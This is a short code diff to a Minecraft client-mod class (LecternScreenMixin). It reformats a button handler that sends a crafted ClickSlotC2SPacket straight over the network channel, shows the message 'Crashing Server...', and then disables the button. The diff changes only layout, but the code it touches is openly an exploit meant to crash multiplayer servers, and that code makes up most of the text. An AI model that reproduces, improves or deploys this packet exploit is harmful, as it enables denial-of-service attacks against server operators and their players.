@@ -52,7 +52,15 @@ public class LecternScreenMixin extends Screen {
                 }
             }
 
-            ((ClientConnectionAccessor) client.getNetworkHandler().getConnection()).getChannel().writeAndFlush(new ClickSlotC2SPacket(client.player.currentScreenHandler.syncId, client.player.currentScreenHandler.getRevision(), 0, 0, SlotActionType.QUICK_MOVE, client.player.currentScreenHandler.getCursorStack().copy(), int2ObjectMap));
+            ((ClientConnectionAccessor) client.getNetworkHandler().getConnection()).getChannel().writeAndFlush(new ClickSlotC2SPacket(
+                    client.player.currentScreenHandler.syncId,
+                    client.player.currentScreenHandler.getRevision(),
+                    0,
+                    0,
+                    SlotActionType.QUICK_MOVE,
+                    client.player.currentScreenHandler.getCursorStack().copy(),
+                    int2ObjectMap
+            ));
             client.player.sendMessage(Text.of("Crashing Server..."), false);
             button.active = false;
         })
@@ -60,10 +68,6 @@ public class LecternScreenMixin extends Screen {
                         .size(100, 20)
                         .build()
         );
-
-
-
-
         }
     }
 }
